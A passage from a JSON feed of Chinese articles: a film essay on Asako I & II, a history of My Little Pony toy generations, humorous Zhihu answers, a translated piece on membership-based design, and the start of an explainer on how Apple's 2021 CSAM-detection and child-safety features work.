alt=\"\"><figcaption>《夜以继日》海报</figcaption></figure><p>这里的双重性，不是指麦和亮平很相像的外表（东出昌大分饰两角），而是指朝子在面对两个男人时互相替代的“双重性爱欲模式”。</p>\n<p>朝子被亮平吸引，最初是因前任麦的始终所留下的铺垫。她在爱上亮平的过程中也同时照样爱着麦，正是麦的“失而不得”，成为了她与亮平的爱中始终悬置、无法直言的情感。</p>\n<p>朝子对麦的记忆已经模糊了，甚至经过美化而呈现出了梦境般的色彩。而这些无法得到满足的欲望，看似是她对麦的怀恋，却在不经意间逐步转化成了她在亮平身上攫取到的爱。</p>\n<p>当麦突然复现，朝子与他私奔后，她在车上醒来，说：“之前发生的所有事就像一场很长的梦，一个很幸福的梦，感觉自己成长了，但是一睁开眼睛，我还是一点都没改变。”</p>\n<p>此时，对于麦的欲望得以满足后，她才得以正视自己早就在生活的日常里，把对于麦的欲望转化为对于亮平的爱。在某个时刻起，麦与亮平在朝子的心中已经替位，只是她一直没有意识到这一点。</p>\n<p>而从欲望的梦里醒来，才驱动着她做出真正的选择。</p>\n<p>结尾，朝子留在了亮平的公寓中。那句“河流很脏、但也很美”，揭示出爱是双重性的幻影，难以抓住，却也在欲望的幻灭后得以最终留存。</p>\n<p>如何认定朝子对亮平的爱呢？也许影片开篇，在她与麦相遇、离遇到亮平还有两年的时候，这份爱就开始萌芽。爱与欲，如同接力棒般传递着、替位着。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4628873ffa4ef042997aa62f9dfc2d72_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《夜以继日》剧照</figcaption></figure><p>从这个角度来讲，无论是《花束般的恋爱》里的绢，《爱情是什么》里的光子，还是《穷途鼠的奶酪梦》里的今之濑，<strong>都没能跨越自我欲望的幻灭，也没能得到那份焚烧得化为灰烬的爱。</strong></p>\n<p>而《夜以继日》里的朝子，意外地以半梦半醒的方式，跨过了这些阶段，获得了一份爱的奇迹。爱是脏的，但也很美。</p>\n<p>/ 全文完</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/327037037\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9739096"},{"title":"彩虹小马的前身叫什么名字？","date":"2021-08-11 23:06:58","description":"<div>\n<div>\n<div>\n<img src=\"https://pica.zhimg.com/v2-2836df3e0ad7c48b187b48330beb863d_l.jpg?source=8673f162\"><span>吴思承，</span><span>A.K.A. VKorpela/Brony/生物狗</span>\n<a href=\"https://www.zhihu.com/question/453205594/answer/1823122273\" hidden>阅读原文</a>\n</div>\n<div>\n<p>这就得看题主所说的“彩虹小马”到底是在指什么了：是 MLP: FiM 的系列动画，是 G4 的玩具，还是 MLP 这个整体？</p>\n<p><strong>如果你指的是 My Little Pony: Friendship is Magic 的动画系列……</strong></p>\n<p>在 FiM 系列以前的 MLP 动画作品习惯上会沿用同期玩具的断代，大致地用 G1、G2 和 G3 区分。</p>\n<ul>\n<li>G1 在电视上播出的作品有<em>My Little Pony</em>（G1，1986~1987 年播出，分两季）和<em>My Little Pony Tales</em>（G1，1992 年播出，一季），另外还有一部 1986 年播出的电影。</li>\n<li>G2 玩具线没有对应的动画，但是有使用动画形象的广告。</li>\n<li>G3 的动画都是以玩具内附赠录像带的方式分发。2008 年孩之宝推出 Ponyville figurines 系列玩具后，玩具附赠的动画也画风突变，常和这一时期的玩具一样被称作 G3.5。</li>\n</ul>\n<figure><img src=\"https://pic2.zhimg.com/v2-ab550a1be1aaee5830c0e2363f56c33a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>时光飞逝，第一代小马的商标已经变成了一个 80 年代的符号，在今天依旧能在一些怀旧复古商品牌中见到</figcaption></figure><p>G4 动画（这里指 FiM，Pony Life 暂不在讨论范围内）的主角们在性格设计上很大程度上参考了 G1 小马们；在名字和外观上受版权、商标等因素影响，也参考了 G3 小马（典型例子是云宝和萍琪）。G3.5 之前的 MLP 作品并没有格外聚焦于固定的一批角色，在玩具发行上更是如此，G4 的主角组概念以及“Mane Six”的称呼也可以视为 G3.5 的“Core Seven”的延续。</p>\n<p>这样看来无论是 G1、G3 还是 G3.5 的动画，某种意义上都可以当成 MLP: FiM 动画系列的前身。</p>\n<p><strong>如果你指的是第四代 My Little Pony 玩具……</strong></p>\n<p>2010 年以前的小马玩具产品线也被玩具收藏家们分为了三代：</p>\n<ul>\n<li>第一代小马（G1）：1982 年开始发行，在美国一直发行至 1992 年，而在美国以外的地区发行到了 1995 年。期间还推出过“My Little Kitty”之类的非小马玩具。</li>\n<li>第二代小马（G2）：1997 年到 1999 年发行，孩之宝使用的称呼是“Friendship Garden”。和 G1 相比，玩具在眼睛和姿势上做出了一定的改动，增加了可以扭的头部，身材也更“瘦高”。据说这一代在欧洲更流行一些，在他们那儿叫做“Ponyland”。</li>\n<li>第三代小马（G3）：2003 年到 2009 年发行，在设计上显然面向的是更加低龄的小朋友们。这一代小马们生活的地方被称作“Ponyville”（很熟悉吧）。早期的玩具只有陆马角色，直到 2005 年和 2006 年才分别引入天马和独角兽。</li>\n<ul>\n<li>2008 年，角色被局限在了称为“Core Seven”的七只小马上。而在 2009 年，玩具在外观上被改为一体成型、比一般 G3 玩具更小的“Ponyville figurines”，被收藏者称为 G3.5。</li>\n<li>一小部分 G3 玩具在 MLP: FiM 开播后仍然发行。</li>\n</ul>\n</ul>\n<figure><img src=\"https://pic1.zhimg.com/v2-e988d35ca13413e28e8d757d74e9ef13_720w.jpg?source=8673f162\" alt=\"\"><figcaption>从第三代小马的商标上，已经能看到第四代小马的影子</figcaption></figure><p><strong>如果你指的是自 1982 年以来发行的整个 My Little Pony 系列……</strong></p>\n<p><strong>整个 MLP 系列还有没有前身呢？答案是肯定的。</strong></p>\n<p>最初 Bonnie Zacherle 女士和 Charles Muenchinger 先生以矮种马为原型设计的玩具在外观上与现实中的小马非常接近，有着棕色身体和浅色鬃毛，没有可爱标记，可以像娃娃一样被梳妆打扮。</p>\n<p><strong>这款玩具被划分到孩之宝的“Romper Room”部门下</strong>，<strong>于 1981 年发行，名称为“My Pretty Pony”。</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-2b9e8bc00d901d3c1ba484ccf8920d08_720w.jpg?source=8673f162\" alt=\"\"><figcaption>1981 年纽约玩具展宣传页</figcaption></figure><p>而在最早的棕色小马发行后，另一款粉色的 My Pretty Pony 玩具出现在了市场上。这一次的小马驹拥有了可爱标记，包装盒上的商标也转变为了与未来的 G1 小马类似的形式。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e262eaac82327640e7ed792e5376ec17_720w.jpg?source=8673f162\" alt=\"\"></figure><p>或许是这两款玩具 10 英寸（约 25 厘米）的个头实在过于巨大，销量并不是特别好。于是后来孩之宝另外制作了个头更小（6 英寸，约 15 厘米）的彩色小马玩具。</p>\n<p>更小版本的小马玩具显然更受欢迎一些，从 1982 年开始以包括邮购在内的各种方式单独上架。作为 My Pretty Pony 的缩小版，新系列的名字被称作 My Little Pony。</p>\n<p>而 My Pretty Pony 系列和更小版本的小马以“My Pretty Pony and Beautiful Baby”的名义混搭，至少售卖到了 1983 年前后。在那之后，My Pretty Pony 系列便消失在了历史长河中。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-30cf9719a83025248293fe3cecbfb233_720w.jpg?source=8673f162\" alt=\"\"><figcaption>那只个头更小的小马名也以“Butterscotch”的名字在 G1 中出现</figcaption></figure><p>MPP 系列的历史尤为短暂，与后继的 MLP 系列相比如昙花一现。但作为最初进行市场试水的玩具系列，收藏家们依旧会时不时以 Generation Zero（G0）称呼，将其视为 MLP 系列的一部分。</p>\n<p><strong>参考资料</strong></p>\n<p>[1] <a href=\"http://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/My_Little_Pony\" target=\"_blank\" rel=\"nofollow noreferrer\">Wikipedia 上的 My Little Pony 页面</a></p>\n<p>[2] <a href=\"http://link.zhihu.com/?target=http%3A//mylittlewiki.org/wiki/My_Pretty_Pony\" target=\"_blank\" rel=\"nofollow noreferrer\">My Little Wiki 上的 My Pretty Pony 页面</a></p>\n<p>[3] <a href=\"http://link.zhihu.com/?target=http%3A//yum-yum-ponyworld.weebly.com/my-pretty-pony.html\" target=\"_blank\" rel=\"nofollow noreferrer\">My Pretty Pony - 1981</a></p>\n<p><strong>延伸阅读</strong></p>\n<p>早些年咱也写过一个 MLP 商标变迁的文章，对 MLP 系列历史感兴趣的话也可以移步阅读：</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/26518366\">吴思承：My Little Pony 商标变迁简史</a></p>\n<p>另一个和 My Little Kitty 系列有关的回答：</p>\n<p><a href=\"https://www.zhihu.com/question/60029299/answer/171627351\">如果小马里面都变成了猫？</a></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/453205594\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9739103"},{"title":"瞎扯 · 如何正确地吐槽","date":"2021-08-11 23:06:51","description":"\n<div>\n<h2>嫦娥不过是一个舞女领班、而天蓬元帅掌管10万天兵、为什么就配不上嫦娥呢?</h2>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-0f65419e5eb5f711af17bfef54c2feaa_l.jpg?source=8673f162\"><span>努力中的懒癌晚期，</span><span>学生</span>\n<a href=\"https://www.zhihu.com/question/424982368/answer/1516840031\" hidden>阅读原文</a>\n</div>\n<div>\n<p>官员配得上侍女不代表官员在国宴强奸侍女未遂闹得众人皆知不会被惩处。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/424982368\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>孩子特别迷恋日本动漫、偷偷学日语，有些日本动漫三观似乎有问题，很是担忧该怎么办？</h2>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-fdb787e3dbc1d2a15f1785fa97517954_l.jpg?source=8673f162\"><span>DR.C，</span><span>画家</span>\n<a href=\"https://www.zhihu.com/question/478808289/answer/2052420745\" hidden>阅读原文</a>\n</div>\n<div>\n<p>李云龙也很喜欢日产机枪，但是这不妨碍他枪毙鬼子。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/478808289\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>巴黎圣日耳曼官宣梅西加盟，如何评价这笔签约？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-0b251255a6d5e4cf1654d3a0f042f058_l.jpg?source=8673f162\"><span>时乙戌，</span><span>公众号时乙戌，微博 时二狗</span>\n<a href=\"https://www.zhihu.com/question/478775587/answer/2051909462\" hidden>阅读原文</a>\n</div>\n<div>\n<p>来自阿根廷的怪物在欧冠登陆</p>\n<p>不可明说的魔王掀翻宇宙航母</p>\n<p>拉玛西亚的叛逃者与巴萨决裂</p>\n<p>梅西与圣日耳曼传来转会绯闻</p>\n<p>至高无上的球王陛下于今日抵达自己忠实的巴黎</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-fe47514dea0ca24834b552f534c1ea82_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/478775587\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>国内跟国外都有哪些名字很好听的史诗武器？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/19117e3246fc853ec18ac734ea54d633_l.jpg?source=8673f162\"><span>超级大爷爷，</span><span>学航天干航空的学渣</span>\n<a href=\"https://www.zhihu.com/question/24478976/answer/33817528\" hidden>阅读原文</a>\n</div>\n<div>\n二向箔，清理用 。\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/24478976\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>因为文身，你被特殊对待过吗？</h2>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-8711aae12ce5d0cf84a36221e8d890c2_l.jpg?source=8673f162\"><span>刘柏铖，</span><span>疯狂滑板店主，华北理工毕业材料狗</span>\n<a href=\"https://www.zhihu.com/question/331533613/answer/764515578\" hidden>阅读原文</a>\n</div>\n<div>\n<p>首先说一下背景，我大学学的高分子材料，算是化工材料啊这一类的学科。下图是我的纹身</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-9c72653019c681fcf5768cd0804b8fec_720w.jpg?source=8673f162\" alt=\"\"></figure><p>有一次考试，巡考的主任从我身边经过，走了两步又折了回来，仔细而又严肃地盯着我。</p>\n<p>盯的我内心快要崩溃了，我寻思，大学也不禁止纹身啊，再说了，就算纹身，我也是个老实孩子啊。</p>\n<p>于是我惊恐的抬头等候老师发落。</p>\n<p>老师终于说话了：我在思考你这个要不要按作弊处理……</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/331533613\">阅读原文<span></span></a></div>\n</div>\n","link":"https://daily.zhihu.com/story/9739105"},{"title":"译文｜数字设计师用这七个步骤，营造专属「会员感」","date":"2021-08-11 09:29:49","description":"\n<h3><strong>专栏文章 首页推荐</strong></h3>\n<p>少数派专栏是 Matrix 社区中的一部分，我们会不定期挑选专栏中最优质的文章，展示来自用户和开发者的真实体验和观点。<a href=\"https://sspai.com/post/65959\" target=\"_blank\">点此</a> 了解什么是少数派专栏，<a href=\"https://sspai.com/columns\" target=\"_blank\">点击</a> 查看全部少数派专栏。</p>\n<p>本文来自 <a href=\"https://sspai.com/column/247\" target=\"_blank\">全球科技</a><a href=\"https://sspai.com/column/247\">之窗</a> 专栏，翻译国外科技媒体的深度文章，帮我们开拓不同的视野。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<p>原文链接：<a href=\"https://thenextweb.com/news/forget-users-and-focus-on-the-7-steps-to-make-your-organization-memberful\" target=\"_blank\">Forget ‘users’ and focus on the 7 steps to make your organization ‘memberful’ (thenextweb.com)</a></p>\n<p>原文作者： <a href=\"https://thenextweb.com/author/harald-dunnink\" target=\"_blank\">Harald Dunnink</a>，Momkai 的创始人兼 <a href=\"http://thecorrespondent.com/\" target=\"_blank\">The Correspondent</a> 的联合创始人。</p>\n<hr>\n<p>会员的参与感可以转化为持久的积极性。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/article/0da9c208cb660c1b44a7ba78578f5546\"></figure><p>Harald Dunnink 是一位创意总监，因领导两项打破世界纪录的众筹活动而闻名。作为战略设计机构 Momkai 的创始人，Harald 一直在寻找他想帮助的品牌创始人，并与他们分享自己的经历。他曾协助推出过全球知名的平台以及经久不衰的产品。</p>\n<p>自从万维网（World Wide Web）诞生以来，「数字设计」和「用户体验」这两种概念便出现在了我们的视野中。对于不同的人来说，这两个短语的意义会有所差别；但大体上来说，这两个词描述的是某人在与网络上的内容打交道时的所学、所见、所感。</p>\n<p>作为一个数字设计师，我被这种用户体验深深吸引了：个人是如何通过网络，以及现实世界与一个组织建立联系的？这种体验（或者说这种「关系」）的性质为何在组织的可持续发展中起如此重要的作用？</p>\n<p>在一个会员制的例子中，公司和客户之间可以创立一种真正的深度关系，即用户在重视产品之外，还会相信企业的理念，并用付费以外的方式来表示支持。不同于一般的「用户」，「会员」的生命周期会长得多。也正因此，用心考虑「会员体验」是值得的。</p>\n<p>用户和会员有什么区别，让公司变得更「会员化」（译注：原文为 become more \"memberful\"）的七步又是怎样的？我将在接下来的部分作出解释。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/article/3f9a6c5f6b33475266bb29048d4c055f\"><figcaption>由 Leon Postma 绘制，Eddy Koek 制作为动画。二者均是 Momkai 的设计师。</figcaption></figure><h2><strong>让公司经久不衰的灵丹妙药</strong></h2>\n<p>在我十八年之前创立的战略设计机构 <a href=\"http://momkai.com/\" target=\"_blank\">Momkai</a>，我和我的团队帮助许多团队的创始人和想要改变的人，帮他们升级品牌、改造数字产品、举办发布会。</p>\n<p>在我们做这些项目的同时，尤其是在我们最近与纽约大学（New York University）和 Jay Rosen 教授的合作<a href=\"https://membershippuzzle.org/people\" target=\"_blank\">「会员谜题计划（Membership Puzzle Project）」</a>之中，我们了解到：能够导向最丰富的的用户体验，让企业在我们这个飞速变化的世界中常驻常新的 <a href=\"https://membershipguide.org/\" target=\"_blank\">灵丹妙药</a>，正是让公司「会员化」的设计方案。</p>\n<blockquote><p>「成功的、基于会员的机构懂得倾听，会去了解他们的会员的喜好——这就将个人的热忱与大家的，一个更大的目标（a shared purpose）联系在一起，取得了个人与团体之间的平衡。」</p></blockquote>\n<p>以上这段话来自 <a href=\"https://twitter.com/emgollie\" target=\"_blank\">Emily Goligoski</a>。她是会员谜题计划的前总监，同时也是《大西洋月刊》（The Atlantic）的一位受众研究高级主管。</p>\n<p>如果你接受了会员制模式的成功，你就可以遵循像《卫报》（The Guardian）这样的媒体公司，或像无广告新闻平台 The Correspondent 这样的初创公司的路线，积累一个由会员组成的，为追求大家的大目标而贡献时间、网络和知识的忠实群体。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/article/cd61eae348bedaedec18eea2cd67ecbc\"></figure><h2>「用户」or「会员」，有何不同？</h2>\n<p>一直以来，我和 Momkai 的工作「核心就是设计良好的用户体验，但是「用户」这个词总能让我想到硅谷不甚光鲜的另外一面，也就是除了财务增长以外全然不顾的样子。于是，对于我想要达到的目标来说，「用户」这个词就显得越发的不合适。</p>\n<p>不同的是，「会员」这个词用在我们助力的项目上就再合适不过了。「会员谜题计划」提到，成为一名会员就相当于与公司缔结了一份「社会合约」（social contract），这份关系可不能简简单单的用付费与否来衡量。</p>\n<p>当然，和公司或者这份事业的金钱交易多半还是少不了的，但成为一名会员意味着你同时也在支持这家公司，支持他们基于大家共同的价值而做出的努力，意味着你成了公司生态环境中的一份子。</p>\n<p>于是，因为有了「公司 - 会员」这一层关系，公司才会时刻鞭策自己要按照他们所展现出的蓝图努力。这种双向的关系催生了注重提供优秀会员体验的新公司和品牌。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/article/0c219ef1421a7020341c9bea1b0ce337\"><figcaption>设计一个「会员感」十足的品牌：先是有了一个基于明确的创始理念而形成的团队，这之后便有了在线平台和活动｜图片来源：<a href=\"https://www.momkai.com/\" target=\"_blank\">Momkai</a></figcaption></figure><p>这不是纸上谈兵也不是花言巧语，相反，我们的专业团队已经帮助世界各地的客户创建了各种会员感十足的项目。</p>\n<p>我们曾帮助 The Correspondent 在 130 多个国家创建了那里的 <a href=\"https://medium.com/@haralddunnink/how-to-design-a-crowdfunding-campaign-on-your-own-terms-and-break-world-records-along-the-way-41abe3f86f8e\" target=\"_blank\">第一个成员俱乐部</a>；我们还让皇家荷兰足球协会的 1200 万名成员的联系更加紧密；通过给<a href=\"https://www.nature.com/articles/d41586-019-03782-z#:~:text=The%20Embassy%20of%20Good%20Science%20is%20one%20such%20platform.,and%20articles%20explaining%20good%20practice.\" target=\"_blank\">「好科学使团」</a>（Embassy of Good Science）和帝国理工学院设计新项目，我们在整个欧洲推广了科学社团；我们在美国为 ULI，这个世界上最大的，有关土地负责任使用的专家网络设计了会员战略；并且在今年夏天帮助了东京的新闻创业公司 <a href=\"https://www.momkai.com/cases/renews\" target=\"_blank\">Renews</a> 成立。</p>\n<p>我说这些可不只是为了自卖自夸：这些项目的成功都表明：当你开始把重心放在会员上，而不是用户时，你可以获得更多价值。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/article/3fa33c1d39187164667d8f7991f22491\"><figcaption>图片来源：<a href=\"https://www.momkai.com/\" target=\"_blank\">Momkai</a></figcaption></figure><p>我们设计的会员平台和会员体验全都是基于我们<a href=\"https://medium.com/@haralddunnink/cultivating-calm-a-design-philosophy-for-the-digital-age-94f3a93912e\" target=\"_blank\">「培养平静」的理念</a>。既然会员是你最强力的支持者，那么只要你不滥用他们的支持，他们就会一如既往地支持你。就像 <a href=\"https://vimeo.com/305284349\" target=\"_blank\">Jay Rosen 在《每日秀》中说的</a>那样，这种方法和「主动吸引」注意力的价值观不同，会员的关注不会像在广告模型中那样被卖给第三方公司。</p>\n<p>因此，我们可以完全专注于创造平静的在线空间——这样，会员的注意不会被内容以外的事物吸引。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/article/c49fd167e88cbc29e25c01ce8d8e94a5\"></figure><h2>那么，什么样的组织才能有更多「会员感」呢？</h2>\n<p>有价值的会员关系建立在以下这些原则上的，这就意味着你要锁定你最忠实的支持者，并学会如何讨取他们的支持。这就意味着为了增进会员感，你首先需要拥有一批忠实的支持者，不论或多或少。通常这是以「重复访问的访客」来计算的，而不是流量（就像在 <a href=\"https://membershipguide.org/handbook/getting-started-with-membership/how-to-know-if-were-ready-for-membership\" target=\"_blank\">纽约大学的教程</a> 中说的一样）。</p>\n<p>一旦你达到了这个目标，就可以往下看了：我们的经验告诉我们为了，达到一个有价值的会员关系，七个要素必不可少：</p>\n<h3>成员要了解你的使命</h3>\n<p>与你的组织互动的人自然会感到一种强烈的共同责任感，共同目的，或者是共同的价值观：</p>\n<ul>\n<li>你的组织是为了何种目的而奋斗？</li>\n<li>这种使命感是怎样传达出去的？</li>\n<li>组织成员能否与你的使命建立清晰的联系？</li>\n</ul>\n<h3>成员应当能够获得他们真正想要的利益</h3>\n<p>增强「会员感」的提案要清楚地表明，用户付出了他们的「礼物」之后能得到何种回报，不管他们付出的「礼物」是钱、时间、还是知识。</p>\n<ul>\n<li>如果我付出了金钱，那么我能获得何种特权？</li>\n<li>如果我提供的是知识，那么这条知识会在何处上线，都有谁能看到，又能如何分享出去？</li>\n<li>如果我付出的是时间，那么我能见到什么人，又能组建什么样的网络？</li>\n</ul>\n<h3>成员需要将「人」视作你组织的中心</h3>\n<p>你的提案毕竟都是围绕着「人」转的。成员能清楚地看到项目与人联系的部分吗？他们是否能够与成员社区的其他人建立联系？</p>\n<h3>成员需要获得平和的，有凝聚力的体验</h3>\n<p>提供「会员感」的倡议采用以人为本的设计方法。你的界面是否能使人感到平静？它的外观是否流露出一种简洁感和美感？有没有促人尝试的那一抹人情味？</p>\n<h3>成员应当和你平起平坐</h3>\n<p>你与成员应当是平起平坐的关系。成员的投入应得到重视，并且提供明确的途径让他们参与你的工作，做出他们的贡献。这种集体的知识分享是促使他人加入的一个重要原因。</p>\n<ul>\n<li>你要用什么方法来邀请成员加入，共享他们宝贵的知识？</li>\n<li>有什么平台可以让他们轻松、高效地参与？</li>\n</ul>\n<h3>成员应该有机会成为你的代言人</h3>\n<p>你的每一个新成员都应该被视作一个可能的代言人。支持成员在他们自己的社区中分享你的使命，讲述你的故事，并在更为广阔的世界中为你宣传。你要怎样为你的成员授权，让他们来给你宣传？</p>\n<h3>成员应当以故事的形式获得实用的建议</h3>\n<p>讲述故事是附带真情实感处理信息和情绪的最自然方式，可以让你的群体更为深切地与一条消息产生共鸣。你讲述的故事是否包含实用的、有用的、可操作的建议？这些建议能否帮助你的成员做出有依据的决定。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/article/6e99f6cc283c9f4631d3d4861b725ba1\"></figure>\n","link":"https://sspai.com/post/67812"},{"title":"从 Apple 儿童安全功能的原理出发，聊聊它为什么引发热议","date":"2021-08-11 08:00:00","description":"\n<p>8 月 5 日，Apple 公布了保护未成年人安全的新举措，计划在今年后续发布的新版系统中引入一系列新的功能和机制<sup class=\"ss-footnote\" href=\"\" title=\"统称「儿童安全功能」\" footnote-id=\"1\">1</sup>，以保护未成年人免受性虐待等违法行为的伤害、阻却涉儿童色情相关内容。尽管这些举措尚未生效，且最初将仅限于美国用户，但已经引发了世界各地安全专家和用户的讨论。</p>\n<p>本文中，我们就来介绍「儿童安全」功能的具体内容及原理，以及它为什么引起了不小的争议。</p>\n<h2>儿童安全功能的内容和原理</h2>\n<p>根据 Apple 上周发布的 <a href=\"https://www.apple.com/child-safety/\" target=\"_blank\">说明</a>，拟上线的儿童安全功能主要包括：</p>\n<ul>\n<li>在信息 app 中向儿童及其家长警示对话中出现的裸露<sup class=\"ss-footnote\" href=\"\" title=\"explicit\" footnote-id=\"2\">2</sup>图片</li>\n<li>在 Siri 和搜索功能中提供儿童安全相关的求助资源和提示信息</li>\n<li>检测 iCloud 图库中的未成年人色情图像，在超过一定门槛后禁用账户同时向安全部门举报</li>\n</ul>\n<p>根据 Apple 的说法，这些功能在设计时就考虑到了对用户隐私的保护并在网站上提供了更多的技术细节，借此我们也值得一探背后的技术原理。</p>\n<p><strong>首先，如果用户在 iOS 中配置了家人共享功能，未成年人的 Apple ID 在信息 app 中的对话将受到基于本地机器学习的监控</strong>。</p>\n<p>举个例子，当未成年人所使用的 Apple ID 在信息 app 中收到或即将发出露骨色情图片时，系统会发出警告，同时图像也会被模糊处理，效果如下图所示：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c49kq3lb34tde822skng.jpeg\"><figcaption>信息 app 中的提示。图源：Apple 网站</figcaption></figure><p>在这些警告和提示中，Apple 会尝试向未成年人解释什么是敏感照片以及分享、查看这些照片所伴随的风险，同时也向未成年用户表明，如果真的要观看或者发送敏感照片，与之关联的家长账户会被告知此事。</p>\n<p>和此前的隐私保护策略中提到的相同，这里 Apple 再次宣称自己无法获取信息 app 中的通信内容，这份说明文档特别强调，即时通信消息对用户而言是相当敏感的隐私数据，因为 iMessage 使用了端到端加密，除了聊天双方，Apple 服务器并不知道用户具体在聊什么。</p>\n<p>所以要判定图像内容是否为「儿童不宜」只能采用本地机器学习，另外就聊天中的图像内容进行提醒、通知家长等信息也不会上传给 Apple 或执法机构。</p>\n<p><strong>其次，Siri 和搜索功能会为用户提供与儿童安全相关的帮助和提示</strong>。</p>\n<p>如果用户搜索如何举报「儿童性虐待内容」<sup class=\"ss-footnote\" href=\"\" title=\"Child Sexual Abuse Material，下文将缩写为 CSAM\" footnote-id=\"3\">3</sup>，那么 Siri 会向用户提供更直接的指引来简化非法内容的举报流程。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c49kq45b34tdfuvpse90.jpeg\"><figcaption>介入并告知用户。图源：Apple 网站</figcaption></figure><p>尽管 Siri 和搜索功能是 Apple 长期以来宣称自己无法获得用户信息的两个领域，如果用户试图在网上查找、获取 CSAM 信息，Siri 和搜索功能还是会介入并告知用户这些数据的非法性和危害性并提供可能需要的帮助，从文档提供的截图来看，这类帮助主要包括匿名热线和心理指导。</p>\n<p><strong>第三，儿童安全功能上线后，Apple 还会检测 iCloud 图库中涉及 CSAM 的非法内容</strong>。</p>\n<p>和上面提到的聊天消息提醒不同的是，iCloud 图库照片检测不仅依赖本地机器学习，因而也成为了本次网络争论的重点。简而言之，如果用户尝试上传了过多的 CSAM 数据，超过了 Apple 设定的「门槛」，Apple 则会知悉上传数据的账号、将其禁用或上报给美国的相关安全部门。</p>\n<p>通过 Apple 官方给出的资料我们可以进一步了解这个扫描流程：美国国家失踪和受虐儿童帮助中心<sup class=\"ss-footnote\" href=\"\" title=\"NCMEC\" footnote-id=\"4\">4</sup>向 Apple 提供了一个基础的数据库，Apple 通过将用户上传到 iCloud 图库的图像资料与这个数据库进行对比，从而确定即将上传的资料是否存在 CSAM 信息。这个资料对比过程发生在用户设备本地。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c49kq4db34tdfuvpse9g.jpeg\"><figcaption>CSAM 检测流程示意图。图源：Apple</figcaption></figure><p>为了尽可能减少匹配中的错误并增加匹配概率，Apple 在这里使用了一项称为 NeuralHash 的技术——将相关机构提供的 CSAM 数据库和用户图像分别转换成 NeuralHash 哈希值，然后对比这些哈希值是否相同、确定用户是否上传了 CSAM 内容。Apple 表示即便一张图片被轻微裁剪、压缩或转换成黑白风格，图像的 NeuralHash 哈希值也不会改变，如此一来可以最大限度地提高检测的精确性。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c49kq4lb34tdfuvpsea0.jpeg\"><figcaption>一张图片和它的黑白版本具有相同的 NeuralHash 哈希值。图源：Apple 给出的技术简介</figcaption></figure><p>本地分析完成后，用户设备上会创建一份包含了匹配结果的加密安全通行证，通行证会通过隐私交集技术<sup class=\"ss-footnote\" href=\"\" title=\"Private Set Intersection，以下简称 PSI\" footnote-id=\"5\">5</sup>进行加密并与图像一起上传到 iCloud 图库，PSI 的加密流程同样也在用户设备本地进行。如此一来 Apple 无法获取除了已匹配的 CSAM 之外其他内容的 NeuralHash 哈希值，一方面保证用户的非 CSAM 内容泄露，另一方面也能避免用户了解到匹配结果。</p>\n<p>至于安全通行证本身，Apple 还采用了称为「秘密分享门槛」的技术<sup class=\"ss-footnote\" href=\"\" title=\"Threshold Secret Sharing\" footnote-id=\"6\">6</sup>作为第二层保障，并宣称「秘密分享门槛」仅有一万亿分之一出错率。在这项技术下，只有获得了足够多的 CSAM 匹配、超过了预先设定的「解密门槛」，Apple 才能将数据解密。</p>\n<p>比如一份隐私内容包含 1000 份碎片，而解密门槛被设定为了 10，如果这一组隐私内容有<strong> </strong>11 份碎片被匹配到了，则认为超过门槛，这部分上传的数据将被解密并交由人工核验；但如果只有 9 份碎片匹配成功，相关数据则会处于加密状态。</p>\n<p>换句话说，用户数据只有达到了一定的门槛后 Apple 才可以将数据解密，从而人工检视这些包含 CSAM 数据的通行证，而其他 iCloud 相册中的照片 Apple 依然无法访问。确认用户上传了非法信息后 Apple 将禁用该 iCloud 账号并向 NCMEC 举报；如果用户认为自己的账号被错误地禁用，也可以向 Apple 提出解禁申诉。</p>\n<h2>围绕新功能的讨论与争议</h2>\n<p>Apple 宣布的上述新举措，尤其是 CSAM 